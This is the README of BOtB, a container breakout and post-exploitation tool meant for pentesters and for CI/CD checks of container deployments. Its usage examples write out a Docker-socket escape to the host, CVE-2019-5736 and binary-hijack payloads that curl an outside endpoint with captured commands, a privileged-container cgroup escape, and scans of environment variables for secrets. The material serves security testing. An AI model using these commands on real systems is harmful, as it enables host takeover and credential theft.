# Break out the Box (BOtB)
BOtB is a container analysis and exploitation tool designed to be used by pentesters and engineers while also being CI/CD friendly with common CI/CD technologies.


# What does it do?
BOtB is a CLI tool which allows you to:
- Exploit common container vulnerabilities
- Perform common container post exploitation actions
- Provide capability when certain tools or binaries are not available in the Container
- Use BOtB's capabilities with CI/CD technologies to test container deployments
- Perform the above in either a manual or automated approach

## Current Capabilities
- Find and Identify UNIX Domain Sockets
- Identify UNIX domain sockets which support HTTP
- Find and identify the Docker Daemon on UNIX domain sockets or on an interface
- Analyze and identify sensitive strings in ENV and process in the ProcFS i.e /Proc/{pid}/Environ
- Identify metadata services endpoints i.e http://169.254.169.254, http://metadata.google.internal/ and http://100.100.100.200/ 
- Perform a container breakout via exposed Docker daemons
- Perform a container breakout via CVE-2019-5736
- Hijack host binaries with a custom payload
- Perform actions in CI/CD mode and only return exit codes > 0
- Scrape metadata info from GCP metadata endpoints
- Push data to an S3 bucket
- Break out of Privileged Containers
- Force BOtB to always return a Exit Code of 0 (useful for non-blocking CI/CD)
- Perform the above from the CLI arguments or from a YAML config file
- Perform reverse DNS lookup

BOtB can also be instructed to load settings from a YAML file via the config parameter
```
# ./botb -config=cfg.yml
[+] Break Out The Box
[+] Loading Config: cfg.yml
...
```

The following usage examples will return a Exit Code > 0 by default when an anomaly is detected, this is depicted by "echo $?" which shows the exit code of the last executed command.

### Find UNIX Domain Sockets
```
#./bob_linux_amd64 -socket=true
[+] Break Out The Box
[+] Hunting Down UNIX Domain Sockets from: /
[!] Valid Socket: /var/meh
[+] Finished

#echo $?
1
```


### Find a Docker Daemon
```
#./bob_linux_amd64 -find-docker=true
[+] Break Out The Box
[+] Looking for Dockerd
[!] Dockerd DOCKER_HOST found: tcp://0.0.0.0:2375
[+] Hunting Docker Socks
[!] Valid Docker Socket: /var/meh
[+] Finished

#echo $?
1
```

### Break out from Container via Exposed Docker Daemon
This approach will breakout into an interactive TTY on the host.
```
#./bob_linux_amd64 -autopwn=true    
[+] Break Out The Box
[+] Attempting to autopwn
[+] Hunting Docker Socks
[+] Attempting to autopwn:  /var/meh
[+] Attempting to escape to host...
[+] Attempting in TTY Mode
./docker/docker -H unix:///var/meh run -t -i -v /:/host alpine:latest /bin/sh
chroot /host && clear
echo 'You are now on the underlying host'
You are now on the underlying host
/ # 
```

### Break out of a Container but in a CI/CD Friendly way
This approach does not escape into a TTY on the host but instead returns an Exit Code > 0 to indicate a successful container breakout.

```
#./bob_linux_amd64 -autopwn=true -cicd=true
[+] Break Out The Box
[+] Attempting to autopwn
[+] Hunting Docker Socks
[+] Attempting to autopwn:  /var/meh
[+] Attempting to escape to host...
[!] Successfully escaped container
[+] Finished

#echo $?
1
```

### Exploit CVE-2019-5736 with a Custom Payload
Please note that for this exploit to work, a process has to be executed in the target container in this scenario.
```
#./bob_linux_amd64 -aggr='curl "https://some.endpoint.com?command=$0&param1=$1&param2=$2">/dev/null 2>&1'
[+] Break Out The Box[!] WARNING THIS OPTION IS NOT CICD FRIENDLY, THIS WILL PROBABLY BREAK THE CONTAINER RUNTIME BUT YOU MIGHT GET SHELLZ...
[+] Attempting to exploit CVE-2019-5736 with command:  curl "https://bobendpoint.herokuapp.com/canary/bobby?command=$0&param1=$
1&param2=$2">/dev/null 2>&1
[+] This process will exit IF an EXECVE is called in the Container or if the Container is manually stopped
[+] Finished
```

### Hijack Commands/Binaries on a Host with a Custom Payload
Please note that this can be used to test if external entities are executing commands within the container. Examples are Docker Exec and Kubetcl CP.

```
#./bob_linux_amd64 -hijack='curl "https://bobendpoint.herokuapp.com/canary/bobby?command=$0&param1=$
1&param2=$2">/dev/null 2>&1'
[+] Break Out The Box
[!] WARNING THIS WILL PROBABLY BREAK THE CONTAINER BUT YOU MAY GET SHELLZ...
[+] Attempting to hijack binaries

[+] Currently hijacking:  /bin
[+] Currently hijacking:  /sbin
[+] Currently hijacking:  /usr/bin
[+] Finished
```

### Analyze ENV and ProcFS Environ for Sensitive Strings
By default BOtB will search for the two terms "secret" and "password".
```
 ./bob_linux_amd64 -recon=true
[+] Break Out The Box
[+] Performing Container Recon
[+] Searching /proc/* for data
[!] Sensitive keyword found in: /proc/1/environ -> 'PATH=/go/bin:/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=0e51200113eaTERM=xtermGOLANG_VERSION=1.12.4GOPATH=/gofoo=secretpasswordHOME=/root'

[+] Checking ENV Variables for secrets
[!] Sensitive Keyword found in ENV:  foo=secretpassword
[+] Finished

#echo $?
1
```

A wordlist can be supplied to BOtB to scan for particular keywords.
```
#cat wordlist.txt 
moo

# ./bob_linux_amd64 -recon=true -wordlist=wordlist.txt
[+] Break Out The Box
[+] Performing Container Recon
[+] Searching /proc/* for data
[*] Loading entries from: wordlist.txt
[+] Checking ENV Variables for secrets
[*] Loading entries from: wordlist.txt
[+] Finished

# echo $?
0
```

### Scan for Metadata Endpoints
BOtB by default scans for two Metadata endpoints.
```
#  ./bob_linux_amd64 -metadata=true                    
[+] Break Out The Box
[*] Attempting to query metadata endpoint: 'http://169.254.169.254/latest/meta-data/'
[*] Attempting to query metadata endpoint: 'http://kubernetes.default.svc/'
[+] Finished

# echo $?
0
```

BOtB can also be supplied with a list of endpoints to scan for.
```
#  cat endpoints.txt 
https://heroku.com

#  ./bob_linux_amd64 -metadata=true -endpointlist=endpoints.txt
[+] Break Out The Box
[*] Loading entries from: endpoints.txt
[*] Attempting to query metadata endpoint: 'https://heroku.com'
[!] Reponse from 'https://heroku.com' -> 200
[+] Finished

# echo $?
1
```


### Scan for UNIX Domain Sockets that respond to HTTP
```
#  ./bob_linux_amd64 -find-http=true
[+] Break Out The Box
[+] Looking for HTTP enabled Sockets
[!] Valid HTTP Socket: /var/run/docker.sock
[+] Finished

```

### Scrape data from GCP metadata instance
```
#  ./botb_linux_amd64 -scrape-gcp=true
[+] Break Out The Box
[+] Attempting to connect to:  169.254.169.254:80

```

### Push data to an AWS S3 Bucket
```
#  ./bob_linux_amd64 -s3push=fileToPush.tar.gz -s3bucket=nameOfS3Bucket -region=eu-west-2
[+] Break Out The Box
[+] Pushing fileToPush.tar.gz -> nameOfS3Bucket
[*] Data uploaded to: https://nameOfS3Bucket.s3.eu-west-2.amazonaws.com/fileToPush.tar.gz
[+] Finished

```

### Break out of a Privileged Container
```
#  ./bob_linux_amd64 -pwn-privileged=hostname
[+] Break Out The Box
[+] Attempting to exploit CGROUP Privileges
[*] The result of your command can be found in /output
[+] Finished
root@418fa238e34d:/app# cat /output 
docker-desktop
```

### Force BOtB to always succeed with a Exit Code of 0
This is useful for non-blocking CI/CD tests
```
#  ./bob_linux_amd64 -pwn-privileged=hostname -always-succeed-true
[+] Break Out The Box
[+] Attempting to exploit CGROUP Privileges
[*] The result of your command can be found in /output
[+] Finished
# echo $?
0

```

### Using BOtB with a YAML config file
Example YAML file cfg.yml

```
payload: id
verbose: false
always-succeed: true
cicd: false
endpointlist: endpoints.txt
wordlist: wordlist.txt
path: /
mode: find-sockets

```
Run BOtB with the above YAML

```
#  ./bob_linux_amd64 -config=cfg.yml
[+] Break Out The Box
[+] Loading Config: cfg.yml
[+] Looking for UNIX Domain Sockets from: /
[!] Valid Socket: /tmp/thisisnotasocket.mock
[+] Finished

```

# Using BOtB with CI\CD
BOtB can be used with CI\CD technologies that make use of exit codes to determine if tests have passed or failed. Below is a Shell script that executes two BOtB tests and the exit codes of the two tests are used to set the exit of the Shell script. If any of the two tests return an Exit Code >0, the test executing the shell script will fail.

```
#!/bin/sh 

exitCode=0

echo "[+] Testing UNIX Sockets"
./bob_linux_amd64 -autopwn -cicd=true
exitCode=$?

echo "[+] Testing Env"
./bob_linux_amd64 -recon=true
exitCode=$?

(exit $exitCode)

```
The above script is not the only way to use BOtB with CI\CD technologies but could also be used by itself and not wrapped in a shell script. An example YML config would be:

```
version: 2
cicd:
  runATest: ./bob_linux_amd64 -autopwn -cicd=true
```

Below is an example config that can be used with Heroku CI:

```
{
    "environments": {
        "test": {
            "scripts": {
                "test": "./bob_linux_amd64 -autopwn -cicd=true"
            }
        }
    }
}
```

Below is an example config with Heroku CI but using a wrapper shell script:

```
{
    "environments": {
        "test": {
            "scripts": {
                "test": "./bin/testSocksAndEnv.sh"
            }
        }
    }
}


```
